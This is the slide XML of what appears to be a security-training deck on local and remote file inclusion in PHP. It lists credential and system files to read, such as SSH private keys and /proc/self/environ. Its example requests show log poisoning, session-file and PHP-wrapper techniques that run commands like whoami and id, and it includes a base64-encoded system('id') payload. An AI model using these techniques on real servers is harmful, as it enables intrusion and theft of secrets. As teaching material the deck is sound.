            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7674412" y="4309229"/>
            <a:ext cx="5087660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/root/.ssh/id_rsa # Root SSH private key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/home/user/.ssh/id_rsa # User SSH private key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/home/user/.ssh/authorized_keys # Authorized SSH keys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20464" y="5228273"/>
            <a:ext cx="2710815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PROCESS INFORMATION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520464" y="5611773"/>
            <a:ext cx="5395555" cy="1355169"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1795"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7512367" y="5611773"/>
            <a:ext cx="5411748" cy="1355169"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1795"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7674412" y="5733336"/>
            <a:ext cx="5087660" cy="111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/proc/self/environ # Environment variables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/proc/self/cmdline # Command line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/proc/self/stat # Process status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/proc/version # Kernel version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/proc/net/tcp # Network connections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9954"/>
            <a:ext cx="63723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WINDOWS SYSTEMS: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02362"/>
            <a:ext cx="3090505" cy="3987284"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1101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959656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SYSTEM FILES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51084" y="3569137"/>
            <a:ext cx="2575917" cy="2517458"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1039773" y="3569137"/>
            <a:ext cx="2598539" cy="2517458"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1266587" y="3739158"/>
            <a:ext cx="214491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C:\windows\system32\drivers\etc\hosts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C:\windows\win.ini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C:\windows\system.ini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C:\boot.ini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11109" y="2702362"/>
            <a:ext cx="3090624" cy="3987284"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1101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8403" y="2959656"/>
            <a:ext cx="257603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IIS CONFIGURATION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68403" y="4277797"/>
            <a:ext cx="2576036" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4357092" y="4277797"/>
            <a:ext cx="2598658" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4583906" y="4447818"/>
            <a:ext cx="21450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C:\inetpub\wwwroot\web.config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C:\windows\system32\inetsrv\config\applicationHost.config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2702362"/>
            <a:ext cx="3090624" cy="3987284"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1101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5842" y="2959656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APPLICATION FILES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85842" y="3923467"/>
            <a:ext cx="2576036" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7674531" y="3923467"/>
            <a:ext cx="2598658" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7901345" y="4093488"/>
            <a:ext cx="21450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C:\xampp\htdocs\config.php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C:\wamp\www\config.php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10745986" y="2702362"/>
            <a:ext cx="3090624" cy="3987284"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1101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03280" y="2959656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LOG FILES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1003280" y="3569137"/>
            <a:ext cx="2576036" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD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91969" y="3569137"/>
            <a:ext cx="2598658" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11218783" y="3739158"/>
            <a:ext cx="21450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C:\windows\system32\logfiles\httperr\httperr1.log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C:\inetpub\logs\LogFiles\W3SVC1\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8158" y="1776770"/>
            <a:ext cx="7050405" cy="889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4.4 LFI TO REMOTE CODE EXECUTION (RCE)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98158" y="2702123"/>
            <a:ext cx="4174331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METHOD 1: LOG POISONING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8158" y="3191828"/>
            <a:ext cx="7050405" cy="18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Concept:</a:t>
            </a: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Inject PHP code into log files, then include the log file to execute the code.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8158" y="3511153"/>
            <a:ext cx="4128135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STEP 1: INJECT PHP CODE INTO ACCESS LOG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98158" y="3867388"/>
            <a:ext cx="7050405" cy="1140262"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1873"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="491133" y="3867388"/>
            <a:ext cx="7064454" cy="1140262"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1873"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="633412" y="3974068"/>
            <a:ext cx="6779895" cy="92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Send malicious User-Agent header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-A "" http://example.com/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This gets logged in /var/log/apache2/access.log as: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192.168.1.1 - - [27/01/2026:10:30:00] "GET / HTTP/1.1" 200 1234 "-" ""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8158" y="5141595"/>
            <a:ext cx="5057894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STEP 2: INCLUDE LOG FILE AND EXECUTE COMMANDS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8158" y="5497830"/>
            <a:ext cx="7050405" cy="954881"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2236"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="491133" y="5497830"/>
            <a:ext cx="7064454" cy="954881"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2236"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="633412" y="5604510"/>
            <a:ext cx="6779895" cy="741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Include the poisoned log file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http://example.com/index.php?file=../../../../var/log/apache2/access.log&amp;cmd=whoami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Result: Executes 'whoami' command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31031"/>
            <a:ext cx="9342715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METHOD 2: PHP SESSION FILES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7241" y="1779984"/>
            <a:ext cx="13055918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Concept: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PHP stores session data in files. Inject PHP code into session data.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7241" y="2389108"/>
            <a:ext cx="22490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87241" y="2740819"/>
            <a:ext cx="4203263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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="787241" y="2914174"/>
            <a:ext cx="4203263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CREATE SESSION WITH MALICIOUS DATA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87241" y="3867983"/>
            <a:ext cx="4203263" cy="1053941"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3202"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="776049" y="3867983"/>
            <a:ext cx="4225647" cy="1053941"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3202"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1000958" y="4036695"/>
            <a:ext cx="3775829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";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213509" y="2389108"/>
            <a:ext cx="22490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3509" y="2740819"/>
            <a:ext cx="4203263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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5213509" y="2914174"/>
            <a:ext cx="4203263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FIND SESSION FILE LOCATION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213509" y="3867983"/>
            <a:ext cx="4203263" cy="3561755"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5202317" y="3867983"/>
            <a:ext cx="4225647" cy="3561755"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 947"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5427226" y="4036695"/>
            <a:ext cx="3775829" cy="32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 PHP session path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/var/lib/php/sessions/sess_[SESSION_ID]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 ID is in cookie: PHPSESSID=abc123def456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 file: /var/lib/php/sessions/sess_abc123def456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639776" y="2389108"/>
            <a:ext cx="22490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9639776" y="2740819"/>
            <a:ext cx="4203383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8" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9639776" y="2914174"/>
            <a:ext cx="3591163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INCLUDE SESSION FILE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639776" y="3516511"/>
            <a:ext cx="4203383" cy="2128718"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1585"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9628584" y="3516511"/>
            <a:ext cx="4225766" cy="2128718"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1585"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9853493" y="3685223"/>
            <a:ext cx="3775948" cy="1791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http://example.com/index.php?file=../../../../var/lib/php/sessions/sess_abc123def456&amp;cmd=id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Result: Executes 'id' command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8396" y="1323380"/>
            <a:ext cx="5744289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ADVANCED EXPLOITATION METHODS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358396" y="1704856"/>
            <a:ext cx="6090880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METHOD 3: /PROC/SELF/ENVIRON EXPLOITATION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58396" y="2078474"/>
            <a:ext cx="7913489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Concept:</a:t>
            </a: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/proc/self/environ contains environment variables including HTTP headers.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358396" y="2339578"/>
            <a:ext cx="3252430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STEP 1: INJECT PHP CODE VIA USER-AGENT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58396" y="2583894"/>
            <a:ext cx="3816787" cy="309920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5551"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352681" y="2583894"/>
            <a:ext cx="3828217" cy="309920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5551"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3467338" y="2669857"/>
            <a:ext cx="3598902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-A "" http://example.com/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58396" y="2958941"/>
            <a:ext cx="3039666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STEP 2: INCLUDE /PROC/SELF/ENVIRON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8396" y="3203258"/>
            <a:ext cx="3816787" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352681" y="3203258"/>
            <a:ext cx="3828217" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3467338" y="3289221"/>
            <a:ext cx="3598902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http://example.com/index.php?file=../../../../proc/self/environ&amp;cmd=ls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Result: Executes 'ls' command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79970" y="2281595"/>
            <a:ext cx="3982045" cy="1977271"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 870"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E1E1A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7494627" y="2339578"/>
            <a:ext cx="2062282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METHOD 4: PHP WRAPPERS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4627" y="2576751"/>
            <a:ext cx="3752731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DBDCD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PHP Wrapper: php://filter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94627" y="2779871"/>
            <a:ext cx="3752731" cy="1413867"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B2B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12" y="2779871"/>
            <a:ext cx="3764161" cy="1413867"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B2B27"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7603569" y="2865834"/>
            <a:ext cx="3534847" cy="124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2B2B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Read source code (base64 encoded)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2B2B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http://example.com/index.php?file=php://filter/convert.base64-encode/resource=config.php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2B2B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Response: Base64 encoded content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2B2B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Decode to see source code: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2B2B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"PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsKJGRiX3VzZXIgPSAicm9vdCI7..." | base64 -d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58396" y="4345781"/>
            <a:ext cx="2150150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PHP WRAPPER: PHP://INPUT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8396" y="4611886"/>
            <a:ext cx="7913489" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352681" y="4611886"/>
            <a:ext cx="7924919" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3467338" y="4697849"/>
            <a:ext cx="7695605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Send POST request with PHP code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--data "" "http://example.com/index.php?file=php://input"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Result: Executes 'whoami' command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8396" y="5458897"/>
            <a:ext cx="1723430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PHP WRAPPER: DATA://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58396" y="5703213"/>
            <a:ext cx="3816787" cy="1137880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1512"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352681" y="5703213"/>
            <a:ext cx="3828217" cy="1137880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1512"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3467338" y="5789176"/>
            <a:ext cx="3598902" cy="96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 PHP code directly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http://example.com/index.php?file=data://text/plain,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Base64 encoded version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http://example.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==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62599" y="5458897"/>
            <a:ext cx="1930241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PHP WRAPPER: EXPECT://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62599" y="5703213"/>
            <a:ext cx="3816787" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7456884" y="5703213"/>
            <a:ext cx="3828217" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2376"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7571542" y="5789176"/>
            <a:ext cx="3598902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Requires expect:// wrapper to be enabled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http://example.com/index.php?file=expect://whoami</a:t>
            </a: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endParaRPr lang="en-US" sz="9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Result: Executes 'whoami' command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46739" y="1067514"/>
            <a:ext cx="6720602" cy="1183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5. REMOTE FILE INCLUSION (RFI)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246739" y="2314694"/>
            <a:ext cx="3789164" cy="47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5.1 WHAT IS RFI?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7246739" y="3025616"/>
            <a:ext cx="6720602" cy="55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Remote File Inclusion allows attackers to include files from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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external servers</a:t>
            </a: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 This is more dangerous than LFI because attackers can host malicious code on their own servers.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246739" y="3818930"/>
            <a:ext cx="2841903" cy="35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PREREQUISITES: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246739" y="4411385"/>
            <a:ext cx="6720602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PHP Configuration (php.ini):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46739" y="4867394"/>
            <a:ext cx="6720602" cy="1118116"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2542"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7237333" y="4867394"/>
            <a:ext cx="6739414" cy="1118116"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2542"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7426762" y="5009436"/>
            <a:ext cx="6360557" cy="8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allow_url_fopen = On # Must be enabled</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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allow_url_include = On # Must be enabled (disabled by default in PHP 5.2+)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246739" y="6163508"/>
            <a:ext cx="6720602" cy="998577"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD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168" y="6432471"/>
            <a:ext cx="236815" cy="1894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2411" y="6369010"/>
            <a:ext cx="5915501" cy="55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Security Note:</a:t>
            </a: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RFI is significantly more dangerous than LFI as it allows complete remote code execution from attacker-controlled servers.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252" y="729734"/>
            <a:ext cx="5817156" cy="610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5.2 BASIC RFI ATTACK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4252" y="1408033"/>
            <a:ext cx="3101102" cy="366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VULNERABLE CODE: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4252" y="2027277"/>
            <a:ext cx="13261896" cy="584240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5020"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="674489" y="2027277"/>
            <a:ext cx="13281422" cy="584240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5020"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="869990" y="2173843"/>
            <a:ext cx="1289042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4252" y="2864287"/>
            <a:ext cx="2932628" cy="366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ATTACK STEPS:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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52" y="3483531"/>
            <a:ext cx="6630948" cy="7820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9753" y="4434007"/>
            <a:ext cx="6239947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STEP 1: CREATE MALICIOUS PHP FILE ON ATTACKER'S SERVER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79753" y="5234583"/>
            <a:ext cx="6239947" cy="584240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5020"/>
            </a:avLst>
          </a:prstGeom>
